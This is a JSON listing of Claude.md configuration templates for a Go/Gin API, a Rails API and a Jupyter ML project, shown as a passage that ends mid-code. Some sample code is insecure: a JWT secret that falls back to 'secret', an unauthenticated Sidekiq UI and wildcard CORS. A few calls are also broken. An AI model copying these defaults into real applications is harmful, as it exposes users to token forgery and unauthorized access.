Controllers\n```go\n// internal/controllers/user_controller.go\npackage controllers\n\nimport (\n    \"net/http\"\n    \"strconv\"\n\n    \"your-app/internal/models\"\n    \"your-app/internal/services\"\n    \"your-app/pkg/utils\"\n\n    \"github.com/gin-gonic/gin\"\n    \"github.com/go-playground/validator/v10\"\n)\n\ntype UserController struct {\n    userService services.UserService\n    validator   *validator.Validate\n}\n\nfunc NewUserController(userService services.UserService) *UserController {\n    return &UserController{\n        userService: userService,\n        validator:   validator.New(),\n    }\n}\n\n// GetUsers godoc\n// @Summary Get users\n// @Description Get list of users with pagination\n// @Tags users\n// @Accept json\n// @Produce json\n// @Param page query int false \"Page number\" default(1)\n// @Param limit query int false \"Items per page\" default(10)\n// @Success 200 {object} utils.PaginatedResponse\n// @Failure 400 {object} utils.ErrorResponse\n// @Router /users [get]\nfunc (c *UserController) GetUsers(ctx *gin.Context) {\n    page, _ := strconv.Atoi(ctx.DefaultQuery(\"page\", \"1\"))\n    limit, _ := strconv.Atoi(ctx.DefaultQuery(\"limit\", \"10\"))\n\n    if page < 1 {\n        page = 1\n    }\n    if limit < 1 || limit > 100 {\n        limit = 10\n    }\n\n    users, total, err := c.userService.GetUsers(page, limit)\n    if err != nil {\n        utils.ErrorResponse(ctx, http.StatusInternalServerError, \"Failed to get users\", err)\n        return\n    }\n\n    var userResponses []models.UserResponse\n    for _, user := range users {\n        userResponses = append(userResponses, user.ToResponse())\n    }\n\n    utils.PaginatedResponse(ctx, userResponses, page, limit, total)\n}\n\n// CreateUser godoc\n// @Summary Create user\n// @Description Create a new user\n// @Tags users\n// @Accept json\n// @Produce json\n// @Param user body models.CreateUserRequest true \"User data\"\n// @Success 201 {object} models.UserResponse\n// @Failure 400 {object} utils.ErrorResponse\n// @Router /users [post]\nfunc (c *UserController) CreateUser(ctx *gin.Context) {\n    var req models.CreateUserRequest\n    if err := ctx.ShouldBindJSON(&req); err != nil {\n        utils.ValidationErrorResponse(ctx, err)\n        return\n    }\n\n    if err := c.validator.Struct(&req); err != nil {\n        utils.ValidationErrorResponse(ctx, err)\n        return\n    }\n\n    user, err := c.userService.CreateUser(&req)\n    if err != nil {\n        utils.ErrorResponse(ctx, http.StatusBadRequest, \"Failed to create user\", err)\n        return\n    }\n\n    ctx.JSON(http.StatusCreated, user.ToResponse())\n}\n```\n\n### Authentication Middleware\n```go\n// internal/middleware/auth.go\npackage middleware\n\nimport (\n    \"net/http\"\n    \"strings\"\n\n    \"your-app/pkg/utils\"\n\n    \"github.com/gin-gonic/gin\"\n    \"github.com/golang-jwt/jwt/v4\"\n)\n\nfunc AuthRequired() gin.HandlerFunc {\n    return func(c *gin.Context) {\n        tokenString := c.GetHeader(\"Authorization\")\n        if tokenString == \"\" {\n            utils.ErrorResponse(c, http.StatusUnauthorized, \"Authorization header required\", nil)\n            c.Abort()\n            return\n        }\n\n        // Remove \"Bearer \" prefix\n        tokenString = strings.TrimPrefix(tokenString, \"Bearer \")\n\n        token, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {\n            return []byte(utils.GetEnv(\"JWT_SECRET\", \"secret\")), nil\n        })\n\n        if err != nil || !token.Valid {\n            utils.ErrorResponse(c, http.StatusUnauthorized, \"Invalid token\", err)\n            c.Abort()\n            return\n        }\n\n        if claims, ok := token.Claims.(jwt.MapClaims); ok {\n            c.Set(\"user_id\", claims[\"user_id\"])\n            c.Set(\"email\", claims[\"email\"])\n        }\n\n        c.Next()\n    }\n}\n```\n\n## Testing\n\n- Use Go's built-in testing package\n- Write unit tests for services and repositories\n- Use testify for assertions\n- Mock dependencies with interfaces\n- Write integration tests for controllers\n\n## Database\n\n- Use GORM for ORM operations\n- Implement database migrations\n- Use connection pooling\n- Implement proper indexing\n- Handle transactions properly\n\n## Deployment\n\n- Build static binary with Go\n- Use Docker for containerization\n- Deploy with proper environment configuration\n- Set up health checks and monitoring\n- Use graceful shutdown",
      "tags": [
        {
          "tag": {
            "id": "go",
            "name": "go",
            "slug": "go"
          }
        },
        {
          "tag": {
            "id": "gin",
            "name": "gin",
            "slug": "gin"
          }
        },
        {
          "tag": {
            "id": "gorm",
            "name": "gorm",
            "slug": "gorm"
          }
        },
        {
          "tag": {
            "id": "rest-api",
            "name": "rest-api",
            "slug": "rest-api"
          }
        },
        {
          "tag": {
            "id": "golang",
            "name": "golang",
            "slug": "golang"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 26,
        "copies": 94
      },
      "_count": {
        "votes": 32,
        "copies": 122
      },
      "difficulty": "INTERMEDIATE",
      "language": "Go",
      "framework": "Gin",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": true
    },
    {
      "id": "ruby-rails-api",
      "title": "Ruby on Rails API + ActiveRecord",
      "slug": "ruby-rails-api-activerecord",
      "tagline": "Ruby on Rails configuration for intermediate developers",
      "description": "Ruby on Rails API application with ActiveRecord, modern Rails patterns, and comprehensive backend features.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Ruby on Rails API + ActiveRecord\n\n## Project Overview\n\nThis is a Ruby on Rails API application using ActiveRecord ORM, following Rails conventions and modern Ruby development practices for scalable backend systems.\n\n## Technology Stack\n\n- **Language**: Ruby 3.2+\n- **Framework**: Ruby on Rails 7.1+\n- **ORM**: ActiveRecord\n- **Database**: PostgreSQL\n- **Authentication**: JWT with Devise\n- **Testing**: RSpec with FactoryBot\n- **Documentation**: RSwag for API docs\n- **Background Jobs**: Sidekiq\n\n## Project Structure\n\n```\napp/\n├── controllers/         # API controllers\n│   └── api/\n│       └── v1/         # API version 1\n├── models/             # ActiveRecord models\n├── serializers/        # JSON serializers\n├── services/           # Business logic services\n├── jobs/               # Background jobs\n└── lib/                # Custom libraries\nconfig/\n├── routes.rb           # Route definitions\n├── database.yml        # Database configuration\n└── application.rb      # Application configuration\ndb/\n├── migrate/            # Database migrations\n└── seeds.rb           # Database seeds\nspec/                  # RSpec tests\n```\n\n## Development Guidelines\n\n### Code Style\n- Follow Ruby style guide and Rails conventions\n- Use Rubocop for code formatting\n- Implement proper error handling\n- Use ActiveRecord validations\n- Follow RESTful resource patterns\n\n### API Design\n- Use Rails API mode\n- Implement proper serialization\n- Use consistent error responses\n- Implement pagination with Kaminari\n- Follow JSON API standards\n\n### Performance\n- Use database indexing\n- Implement eager loading to avoid N+1 queries\n- Use caching with Redis\n- Implement background jobs for heavy tasks\n- Use database connection pooling\n\n## Key Commands\n\n- `rails server` - Start development server\n- `rails console` - Open Rails console\n- `rails generate` - Generate Rails components\n- `rails db:migrate` - Run database migrations\n- `rspec` - Run tests\n- `rubocop` - Run code linting\n\n## Environment Variables\n\nCreate a `.env` file:\n```\nDATABASE_URL=postgresql://user:password@localhost/myapp_development\nREDIS_URL=redis://localhost:6379/0\nJWT_SECRET=your-jwt-secret-key\nRAILS_ENV=development\nSECRET_KEY_BASE=your-secret-key-base\n```\n\n## Common Patterns\n\n### Rails Application Configuration\n```ruby\n# config/application.rb\nrequire_relative \"boot\"\nrequire \"rails\"\n\n# Pick the frameworks you want:\nrequire \"active_model/railtie\"\nrequire \"active_job/railtie\"\nrequire \"active_record/railtie\"\nrequire \"active_storage/engine\"\nrequire \"action_controller/railtie\"\nrequire \"action_mailer/railtie\"\nrequire \"action_mailbox/engine\"\nrequire \"action_text/engine\"\nrequire \"action_view/railtie\"\nrequire \"action_cable/engine\"\n\nBundler.require(*Rails.groups)\n\nmodule MyApp\n  class Application < Rails::Application\n    config.load_defaults 7.1\n\n    # API-only application\n    config.api_only = true\n\n    # CORS configuration\n    config.middleware.insert_before 0, Rack::Cors do\n      allow do\n        origins '*'\n        resource '*',\n                 headers: :any,\n                 methods: [:get, :post, :put, :patch, :delete, :options, :head],\n                 credentials: false\n      end\n    end\n\n    # Timezone\n    config.time_zone = 'UTC'\n\n    # Autoload paths\n    config.autoload_paths += %W(#{config.root}/lib)\n\n    # Active Job queue adapter\n    config.active_job.queue_adapter = :sidekiq\n  end\nend\n```\n\n### ActiveRecord Models\n```ruby\n# app/models/user.rb\nclass User < ApplicationRecord\n  has_secure_password\n\n  has_many :posts, dependent: :destroy\n  has_many :comments, dependent: :destroy\n\n  validates :name, presence: true, length: { minimum: 1, maximum: 100 }\n  validates :email, presence: true, uniqueness: { case_sensitive: false },\n            format: { with: URI::MailTo::EMAIL_REGEXP }\n  validates :password, length: { minimum: 8 }, allow_nil: true\n\n  scope :active, -> { where(is_active: true) }\n  scope :by_name, ->(name) { where('name ILIKE ?', \"%#{name}%\") }\n\n  before_save :downcase_email\n\n  def full_name\n    \"#{first_name} #{last_name}\".strip\n  end\n\n  def active?\n    is_active\n  end\n\n  private\n\n  def downcase_email\n    self.email = email.downcase if email.present?\n  end\nend\n\n# app/models/post.rb\nclass Post < ApplicationRecord\n  belongs_to :user\n  has_many :comments, dependent: :destroy\n\n  validates :title, presence: true, length: { maximum: 255 }\n  validates :content, presence: true\n  validates :status, inclusion: { in: %w[draft published archived] }\n\n  scope :published, -> { where(status: 'published') }\n  scope :by_user, ->(user) { where(user: user) }\n  scope :recent, -> { order(created_at: :desc) }\n\n  enum status: { draft: 0, published: 1, archived: 2 }\n\n  def published?\n    status == 'published'\n  end\nend\n```\n\n### API Controllers\n```ruby\n# app/controllers/application_controller.rb\nclass ApplicationController < ActionController::API\n  include ActionController::HttpAuthentication::Token::ControllerMethods\n\n  before_action :authenticate_user!\n\n  rescue_from ActiveRecord::RecordNotFound, with: :record_not_found\n  rescue_from ActiveRecord::RecordInvalid, with: :record_invalid\n  rescue_from ActionController::ParameterMissing, with: :parameter_missing\n\n  private\n\n  def authenticate_user!\n    token = request.headers['Authorization']&.split(' ')&.last\n    \n    if token.blank?\n      render json: { error: 'Authorization token required' }, status: :unauthorized\n      return\n    end\n\n    begin\n      decoded_token = JWT.decode(token, Rails.application.secret_key_base, true, algorithm: 'HS256')\n      user_id = decoded_token[0]['user_id']\n      @current_user = User.find(user_id)\n    rescue JWT::DecodeError, JWT::ExpiredSignature, ActiveRecord::RecordNotFound\n      render json: { error: 'Invalid or expired token' }, status: :unauthorized\n    end\n  end\n\n  def current_user\n    @current_user\n  end\n\n  def record_not_found(exception)\n    render json: { error: 'Record not found' }, status: :not_found\n  end\n\n  def record_invalid(exception)\n    render json: { \n      error: 'Validation failed', \n      details: exception.record.errors.full_messages \n    }, status: :unprocessable_entity\n  end\n\n  def parameter_missing(exception)\n    render json: { error: exception.message }, status: :bad_request\n  end\nend\n\n# app/controllers/api/v1/users_controller.rb\nclass Api::V1::UsersController < ApplicationController\n  before_action :set_user, only: [:show, :update, :destroy]\n\n  # GET /api/v1/users\n  def index\n    @users = User.active\n    @users = @users.by_name(params[:search]) if params[:search].present?\n    @users = @users.page(params[:page]).per(params[:per_page] || 25)\n\n    render json: {\n      data: ActiveModelSerializers::SerializableResource.new(@users),\n      meta: pagination_meta(@users)\n    }\n  end\n\n  # GET /api/v1/users/:id\n  def show\n    render json: @user, serializer: UserSerializer\n  end\n\n  # POST /api/v1/users\n  def create\n    @user = User.new(user_params)\n\n    if @user.save\n      render json: @user, serializer: UserSerializer, status: :created\n    else\n      render json: { \n        error: 'User creation failed', \n        details: @user.errors.full_messages \n      }, status: :unprocessable_entity\n    end\n  end\n\n  # PATCH/PUT /api/v1/users/:id\n  def update\n    if @user.update(user_params)\n      render json: @user, serializer: UserSerializer\n    else\n      render json: { \n        error: 'User update failed', \n        details: @user.errors.full_messages \n      }, status: :unprocessable_entity\n    end\n  end\n\n  # DELETE /api/v1/users/:id\n  def destroy\n    @user.destroy\n    head :no_content\n  end\n\n  private\n\n  def set_user\n    @user = User.find(params[:id])\n  end\n\n  def user_params\n    params.require(:user).permit(:name, :email, :password, :is_active)\n  end\n\n  def pagination_meta(collection)\n    {\n      current_page: collection.current_page,\n      per_page: collection.limit_value,\n      total_pages: collection.total_pages,\n      total_count: collection.total_count\n    }\n  end\nend\n```\n\n### Serializers\n```ruby\n# app/serializers/user_serializer.rb\nclass UserSerializer < ActiveModel::Serializer\n  attributes :id, :name, :email, :is_active, :created_at, :updated_at\n\n  has_many :posts, serializer: PostSerializer\n\n  def created_at\n    object.created_at.iso8601\n  end\n\n  def updated_at\n    object.updated_at.iso8601\n  end\nend\n\n# app/serializers/post_serializer.rb\nclass PostSerializer < ActiveModel::Serializer\n  attributes :id, :title, :content, :status, :created_at, :updated_at\n\n  belongs_to :user, serializer: UserSerializer\n  has_many :comments, serializer: CommentSerializer\n\n  def created_at\n    object.created_at.iso8601\n  end\n\n  def updated_at\n    object.updated_at.iso8601\n  end\nend\n```\n\n### Service Objects\n```ruby\n# app/services/user_service.rb\nclass UserService\n  def self.create(params)\n    user = User.new(params)\n    \n    if user.save\n      # Send welcome email in background\n      UserMailer.welcome_email(user).deliver_later\n      \n      # Create user profile\n      UserProfile.create(user: user)\n      \n      user\n    else\n      raise ActiveRecord::RecordInvalid, user\n    end\n  end\n\n  def self.authenticate(email, password)\n    user = User.find_by(email: email.downcase)\n    \n    if user&.authenticate(password) && user.active?\n      user\n    else\n      nil\n    end\n  end\n\n  def self.generate_jwt_token(user)\n    payload = {\n      user_id: user.id,\n      email: user.email,\n      exp: 24.hours.from_now.to_i\n    }\n    \n    JWT.encode(payload, Rails.application.secret_key_base, 'HS256')\n  end\nend\n```\n\n### Database Migrations\n```ruby\n# db/migrate/20241201000001_create_users.rb\nclass CreateUsers < ActiveRecord::Migration[7.1]\n  def change\n    create_table :users do |t|\n      t.string :name, null: false\n      t.string :email, null: false\n      t.string :password_digest, null: false\n      t.boolean :is_active, default: true\n      t.timestamps\n    end\n\n    add_index :users, :email, unique: true\n    add_index :users, :is_active\n  end\nend\n\n# db/migrate/20241201000002_create_posts.rb\nclass CreatePosts < ActiveRecord::Migration[7.1]\n  def change\n    create_table :posts do |t|\n      t.string :title, null: false\n      t.text :content, null: false\n      t.integer :status, default: 0\n      t.references :user, null: false, foreign_key: true\n      t.timestamps\n    end\n\n    add_index :posts, :status\n    add_index :posts, :created_at\n  end\nend\n```\n\n### Background Jobs\n```ruby\n# app/jobs/email_job.rb\nclass EmailJob < ApplicationJob\n  queue_as :mailers\n\n  def perform(user_id, email_type, options = {})\n    user = User.find(user_id)\n    \n    case email_type\n    when 'welcome'\n      UserMailer.welcome_email(user).deliver_now\n    when 'notification'\n      UserMailer.notification_email(user, options[:message]).deliver_now\n    end\n  end\nend\n```\n\n### Routes Configuration\n```ruby\n# config/routes.rb\nRails.application.routes.draw do\n  namespace :api do\n    namespace :v1 do\n      resources :users\n      resources :posts do\n        resources :comments, only: [:index, :create, :destroy]\n      end\n\n      # Authentication routes\n      post '/auth/login', to: 'authentication#login'\n      post '/auth/register', to: 'authentication#register'\n      delete '/auth/logout', to: 'authentication#logout'\n\n      # Health check\n      get '/health', to: 'health#check'\n    end\n  end\n\n  # Sidekiq web UI\n  require 'sidekiq/web'\n  mount Sidekiq::Web => '/sidekiq'\nend\n```\n\n### Testing with RSpec\n```ruby\n# spec/models/user_spec.rb\nrequire 'rails_helper'\n\nRSpec.describe User, type: :model do\n  describe 'validations' do\n    it 'is valid with valid attributes' do\n      user = build(:user)\n      expect(user).to be_valid\n    end\n\n    it 'is not valid without a name' do\n      user = build(:user, name: nil)\n      expect(user).not_to be_valid\n    end\n\n    it 'is not valid with duplicate email' do\n      create(:user, email: 'test@example.com')\n      user = build(:user, email: 'test@example.com')\n      expect(user).not_to be_valid\n    end\n  end\n\n  describe 'associations' do\n    it 'has many posts' do\n      association = described_class.reflect_on_association(:posts)\n      expect(association.macro).to eq :has_many\n    end\n  end\n\n  describe 'scopes' do\n    let!(:active_user) { create(:user, is_active: true) }\n    let!(:inactive_user) { create(:user, is_active: false) }\n\n    it 'returns only active users' do\n      expect(User.active).to include(active_user)\n      expect(User.active).not_to include(inactive_user)\n    end\n  end\nend\n\n# spec/factories/users.rb\nFactoryBot.define do\n  factory :user do\n    name { Faker::Name.name }\n    email { Faker::Internet.email }\n    password { 'password123' }\n    is_active { true }\n  end\nend\n```\n\n## Testing\n\n- Use RSpec for testing framework\n- Use FactoryBot for test data\n- Test models, controllers, and services\n- Use VCR for external API testing\n- Write integration tests for API endpoints\n\n## Database\n\n- Use ActiveRecord for ORM operations\n- Write proper database migrations\n- Use database indexing for performance\n- Implement database seeds for development\n- Use database transactions for complex operations\n\n## Deployment\n\n- Use Capistrano for deployment\n- Configure for production environment\n- Set up background job processing\n- Implement proper logging\n- Use environment-specific configurations",
      "tags": [
        {
          "tag": {
            "id": "ruby",
            "name": "ruby",
            "slug": "ruby"
          }
        },
        {
          "tag": {
            "id": "rails",
            "name": "rails",
            "slug": "rails"
          }
        },
        {
          "tag": {
            "id": "activerecord",
            "name": "activerecord",
            "slug": "activerecord"
          }
        },
        {
          "tag": {
            "id": "api",
            "name": "api",
            "slug": "api"
          }
        },
        {
          "tag": {
            "id": "ruby-on-rails",
            "name": "ruby-on-rails",
            "slug": "ruby-on-rails"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 10,
        "copies": 158
      },
      "_count": {
        "votes": 52,
        "copies": 197
      },
      "difficulty": "INTERMEDIATE",
      "language": "Ruby",
      "framework": "Ruby on Rails",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "jupyter-ml-project",
      "title": "Jupyter ML Project + Python",
      "slug": "jupyter-ml-project-python",
      "tagline": "Jupyter configuration for intermediate developers",
      "description": "Complete machine learning project setup with Jupyter notebooks, data analysis, and model development workflows.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Jupyter ML Project + Python\n\n## Project Overview\n\nThis is a comprehensive machine learning project setup using Jupyter notebooks, pandas for data manipulation, scikit-learn for modeling, and modern Python data science practices.\n\n## Technology Stack\n\n- **Language**: Python 3.9+\n- **Environment**: Jupyter Lab/Notebook\n- **Data Processing**: Pandas, NumPy\n- **Visualization**: Matplotlib, Seaborn, Plotly\n- **ML Library**: Scikit-learn, XGBoost\n- **Model Deployment**: MLflow, FastAPI\n- **Version Control**: DVC (Data Version Control)\n\n## Project Structure\n\n```\n├── data/\n│   ├── raw/             # Original, immutable data\n│   ├── interim/         # Intermediate data (cleaned)\n│   ├── processed/       # Final datasets for modeling\n│   └── external/        # External data sources\n├── notebooks/\n│   ├── exploratory/     # EDA notebooks\n│   ├── modeling/        # Model development\n│   └── reporting/       # Final analysis\n├── src/\n│   ├── data/           # Data processing scripts\n│   ├── features/       # Feature engineering\n│   ├── models/         # Model training/prediction\n│   └── visualization/ # Plotting utilities\n├── models/             # Trained model artifacts\n├── reports/            # Analysis reports\n└── requirements.txt    # Python dependencies\n```\n\n## Development Guidelines\n\n### Code Style\n- Follow PEP 8 style guidelines\n- Use type hints for functions\n- Document functions with docstrings\n- Keep notebooks clean and well-documented\n- Use meaningful variable names\n\n### Data Science Workflow\n- Start with exploratory data analysis (EDA)\n- Follow the CRISP-DM methodology\n- Version control data with DVC\n- Validate data quality at each step\n- Document assumptions and decisions\n\n### Reproducibility\n- Set random seeds for reproducible results\n- Use environment.yml for dependencies\n- Document data sources and preprocessing steps\n- Create automated pipelines where possible\n- Track experiments with MLflow\n\n## Key Commands\n\n- `jupyter lab` - Start Jupyter Lab\n- `jupyter notebook` - Start Jupyter Notebook\n- `python -m pip install -r requirements.txt` - Install dependencies\n- `python src/data/make_dataset.py` - Process raw data\n- `python src/models/train_model.py` - Train model\n- `mlflow ui` - View experiment tracking\n\n## Environment Setup\n\nCreate a `requirements.txt` file:\n```\n# Core data science stack\npandas==2.1.4\nnumpy==1.24.3\nmatplotlib==3.7.2\nseaborn==0.12.2\nplotly==5.17.0\n\n# Machine learning\nscikit-learn==1.3.2\nxgboost==2.0.2\nlightgbm==4.1.0\n\n# Jupyter environment\njupyter==1.0.0\njupyterlab==4.0.9\nipykernel==6.27.1\nipywidgets==8.1.1\n\n# Model tracking and deployment\nmlflow==2.8.1\nfastapi==0.104.1\nuvicorn==0.24.0\n\n# Data version control\ndvc==3.30.1\n\n# Utilities\npython-dotenv==1.0.0\nrequests==2.31.0\ntqdm==4.66.1\n```\n\n## Common Patterns\n\n### Data Loading and Exploration\n```python\n# notebooks/exploratory/01_data_exploration.ipynb\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport seaborn as sns\nfrom pathlib import Path\nimport warnings\nwarnings.filterwarnings('ignore')\n\n# Set up plotting\nplt.style.use('seaborn-v0_8')\nsns.set_palette(\"husl\")\n\n# Load data\ndef load_data(filepath: str) -> pd.DataFrame:\n    \"\"\"Load dataset from CSV file.\"\"\"\n    data_path = Path(filepath)\n    if not data_path.exists():\n        raise FileNotFoundError(f\"Data file not found: {filepath}\")\n    \n    df = pd.read_csv(data_path)\n    print(f\"Data loaded: {df.shape[0]} rows, {df.shape[1]} columns\")\n    return df\n\n# Basic data exploration\ndef explore_data(df: pd.DataFrame) -> None:\n    \"\"\"Perform basic data exploration.\"\"\"\n    print(\"=== Dataset Overview ===\")\n    print(f\"Shape: {df.shape}\")\n    print(f\"Memory usage: {df.memory_usage(deep=True).sum() / 1024**2:.2f} MB\")\n    \n    print(\"\\n=== Data Types ===\")\n    print(df.dtypes.value_counts())\n    \n    print(\"\\n=== Missing Values ===\")\n    missing = df.isnull().sum()\n    missing_pct = (missing / len(df)) * 100\n    missing_df = pd.DataFrame({\n        'Missing Count': missing,\n        'Missing %': missing_pct\n    })\n    print(missing_df[missing_df['Missing Count'] > 0])\n    \n    print(\"\\n=== Numerical Summary ===\")\n    print(df.describe())\n\n# Load and explore data\ndf = load_data('../data/raw/dataset.csv')\nexplore_data(df)\n\n# Visualize distributions\ndef plot_distributions(df: pd.DataFrame, columns: list, figsize: tuple = (15, 10)):\n    \"\"\"Plot distributions for numerical columns.\"\"\"\n    n_cols = len(columns)\n    n_rows = (n_cols + 2) // 3\n    \n    fig, axes = plt.subplots(n_rows, 3, figsize=figsize)\n    axes = axes.flatten() if n_rows > 1 else [axes]\n    \n    for i, col in enumerate(columns):\n        if i < len(axes):\n            df[col].hist(bins=30, ax=axes[i], alpha=0.7)\n            axes[i].set_title(f'Distribution of {col}')\n            axes[i].set_xlabel(col)\n            axes[i].set_ylabel('Frequency')\n    \n    # Hide empty subplots\n    for i in range(len(columns), len(axes)):\n        axes[i].hide()\n    \n    plt.tight_layout()\n    plt.show()\n\n# Plot numerical distributions\nnumerical_cols = df.select_dtypes(include=[np.number]).columns.tolist()\nplot_distributions(df, numerical_cols[:9])  # Plot first 9 numerical columns\n```\n\n### Feature Engineering\n```python\n# src/features/build_features.py\nimport pandas as pd\nimport numpy as np\nfrom sklearn.preprocessing import (\n    StandardScaler, \n    MinMaxScaler, \n    LabelEncoder, \n    OneHotEncoder\n)\nfrom sklearn.feature_selection import SelectKBest, f_classif\nfrom typing import List, Tuple, Dict, Any\n\nclass FeatureEngineer:\n    \"\"\"Feature engineering pipeline for ML projects.\"\"\"\n    \n    def __init__(self):\n        self.scalers = {}\n        self.encoders = {}\n        self.feature_selectors = {}\n    \n    def create_datetime_features(self, df: pd.DataFrame, date_col: str) -> pd.DataFrame:\n        \"\"\"Extract datetime features from date column.\"\"\"\n        df = df.copy()\n        df[date_col] = pd.to_datetime(df[date_col])\n        \n        # Extract datetime components\n        df[f'{date_col}_year'] = df[date_col].dt.year\n        df[f'{date_col}_month'] = df[date_col].dt.month\n        df[f'{date_col}_day'] = df[date_col].dt.day\n        df[f'{date_col}_dayofweek'] = df[date_col].dt.dayofweek\n        df[f'{date_col}_quarter'] = df[date_col].dt.quarter\n        df[f'{date_col}_is_weekend'] = df[date_col].dt.dayofweek.isin([5, 6]).astype(int)\n        \n        return df\n    \n    def create_interaction_features(self, df: pd.DataFrame, col_pairs: List[Tuple[str, str]]) -> pd.DataFrame:\n        \"\"\"Create interaction features between column pairs.\"\"\"\n        df = df.copy()\n        \n        for col1, col2 in col_pairs:\n            if col1 in df.columns and col2 in df.columns:\n                # Multiplication interaction\n                df[f'{col1}_{col2}_mult'] = df[col1] * df[col2]\n                \n                # Division interaction (avoid division by zero)\n                df[f'{col1}_{col2}_div'] = df[col1] / (df[col2] + 1e-8)\n                \n                # Difference\n                df[f'{col1}_{col2}_diff'] = df[col1] - df[col2]\n        \n        return df\n    \n    def encode_categorical_features(self, df: pd.DataFrame, categorical_cols: List[str], \n                                  method: str = 'onehot') -> pd.DataFrame:\n        \"\"\"Encode categorical features.\"\"\"\n        df = df.copy()\n        \n        for col in categorical_cols:\n            if col not in df.columns:\n                continue\n                \n            if method == 'onehot':\n                encoder = OneHotEncoder(sparse_output=False, handle_unknown='ignore')\n                encoded = encoder.fit_transform(df[[col]])\n                \n                # Create column names\n                feature_names = [f'{col}_{val}' for val in encoder.categories_[0]]\n                encoded_df = pd.DataFrame(encoded, columns=feature_names, index=df.index)\n                \n                # Store encoder and merge\n                self.encoders[col] = encoder\n                df = pd.concat([df.drop(col, axis=1), encoded_df], axis=1)\n                \n            elif method == 'label':\n                encoder = LabelEncoder()\n                df[col] = encoder.fit_transform(df[col].astype(str))\n                self.encoders[col] = encoder\n        \n        return df\n    \n    def scale_numerical_features(self, df: pd.DataFrame, numerical_cols: List[str], \n                                method: str = 'standard') -> pd.DataFrame:\n        \"\"\"Scale numerical features.\"\"\"\n        df = df.copy()\n        \n        if method == 'standard':\n            scaler = StandardScaler()\n        elif method == 'minmax':\n            scaler = MinMaxScaler()\n        else:\n            raise ValueError(\"Method must be 'standard' or 'minmax'\")\n        \n        df[numerical_cols] = scaler.fit_transform(df[numerical_cols])\n        self.scalers['numerical'] = scaler\n        \n        return df\n    \n    def select_features(self, X: pd.DataFrame, y: pd.Series, k: int = 10) -> pd.DataFrame:\n        \"\"\"Select top k features using univariate selection.\"\"\"\n        selector = SelectKBest(score_func=f_classif, k=k)\n        X_selected = selector.fit_transform(X, y)\n        \n        # Get selected feature names\n        selected_features = X.columns[selector.get_support()].tolist()\n        self.feature_selectors['univariate'] = selector\n        \n        return pd.DataFrame(X_selected, columns=selected_features, index=X.index)\n\n# Usage example\ndef create_features(df: pd.DataFrame) -> pd.DataFrame:\n    \"\"\"Complete feature engineering pipeline.\"\"\"\n    engineer = FeatureEngineer()\n    \n    # Create datetime features if date column exists\n    if 'date' in df.columns:\n        df = engineer.create_datetime_features(df, 'date')\n    \n    # Create interaction features\n    numerical_cols = df.select_dtypes(include=[np.number]).columns.tolist()\n    if len(numerical_cols) >= 2:\n        interactions = [(numerical_cols[i], numerical_cols[i+1]) \n                       for i in range(min(3, len(numerical_cols)-1))]\n        df = engineer.create_interaction_features(df, interactions)\n    \n    # Encode categorical features\n    categorical_cols = df.select_dtypes(include=['object']).columns.tolist()\n    if categorical_cols:\n        df = engineer.encode_categorical_features(df, categorical_cols, method='onehot')\n    \n    return df, engineer\n```\n\n### Model Training and Evaluation\n```python\n# src/models/train_model.py\nimport pandas as pd\nimport numpy as np\nfrom sklearn.model_selection import train_test_split, cross_val_score, GridSearchCV\nfrom sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier\nfrom sklearn.linear_model import LogisticRegression\nfrom sklearn.metrics import classification_report, confusion_matrix, roc_auc_score\nimport xgboost as xgb\nimport mlflow\nimport mlflow.sklearn\nfrom typing import Dict, Any, Tuple\nimport joblib\nfrom pathlib import Path\n\nclass ModelTrainer:\n    \"\"\"ML model training and evaluation pipeline.\"\"\"\n    \n    def __init__(self, experiment_name: str = \"ml_experiment\"):\n        self.models = {}\n        self.best_model = None\n        self.experiment_name = experiment_name\n        mlflow.set_experiment(experiment_name)\n    \n    def prepare_models(self) -> Dict[str, Any]:\n        \"\"\"Initialize different models for comparison.\"\"\"\n        models = {\n            'logistic_regression': LogisticRegression(random_state=42),\n            'random_forest': RandomForestClassifier(n_estimators=100, random_state=42),\n            'gradient_boosting': GradientBoostingClassifier(random_state=42),\n            'xgboost': xgb.XGBClassifier(random_state=42)\n        }\n        return models\n    \n    def train_evaluate_model(self, model, X_train: pd.DataFrame, X_test: pd.DataFrame,\n                           y_train: pd.Series, y_test: pd.Series, model_name: str) -> Dict[str, float]:\n        \"\"\"Train and evaluate a single model.\"\"\"\n        with mlflow.start_run(run_name=model_name):\n            # Train model\n            model.fit(X_train, y_train)\n            \n            # Predictions\n            y_pred = model.predict(X_test)\n            y_pred_proba = model.predict_proba(X_test)[:, 1] if hasattr(model, 'predict_proba') else None\n            \n            # Calculate metrics\n            accuracy = model.score(X_test, y_test)\n            auc_score = roc_auc_score(y_test, y_pred_proba) if y_pred_proba is not None else 0\n            \n            # Cross-validation\n            cv_scores = cross_val_score(model, X_train, y_train, cv=5)\n            cv_mean = cv_scores.mean()\n            cv_std = cv_scores.std()\n            \n            # Log metrics\n            mlflow.log_metric(\"accuracy\", accuracy)\n            mlflow.log_metric(\"auc_score\", auc_score)\n            mlflow.log_metric(\"cv_mean\", cv_mean)\n            mlflow.log_metric(\"cv_std\", cv_std)\n            \n            # Log model\n            mlflow.sklearn.log_model(model, model_name)\n            \n            # Print results\n            print(f\"\\n{model_name.upper()} Results:\")\n            print(f\"Accuracy: {accuracy:.4f}\")\n            